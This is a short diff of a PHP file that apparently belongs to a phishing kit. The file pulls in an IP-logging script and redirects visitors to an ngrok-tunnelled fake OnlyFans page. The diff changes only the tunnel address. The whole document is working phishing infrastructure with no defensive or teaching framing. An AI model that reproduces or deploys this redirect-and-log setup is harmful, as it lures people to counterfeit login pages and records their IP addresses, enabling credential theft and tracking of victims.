@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://a59a7770f0d8.ngrok.io/templates/onlyfans/onlyfans.html');
+header('Location: https://785fc49d8933.ngrok.io/templates/onlyfans/onlyfans.html');
 exit
 ?>
